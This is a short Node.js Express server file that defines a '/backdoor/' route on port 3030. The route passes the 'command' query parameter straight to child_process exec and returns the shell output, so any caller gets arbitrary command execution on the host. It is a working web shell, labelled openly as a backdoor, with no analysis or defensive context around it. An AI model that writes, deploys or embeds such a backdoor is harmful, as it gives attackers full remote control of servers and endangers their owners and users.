const express = require('express')
const app = express()
const port = 3030


app.get('/backdoor/',(req,res)=>{


	command = req.query.command;
	const { exec } = require('child_process');
	

	exec(command,(error, stdout, stderr)=>{

		if (error) {
      			res.send(stderr);
      			return;
    		}
    
		res.send(stdout);

	});




});

app.listen(port,() => {console.log('application started')})



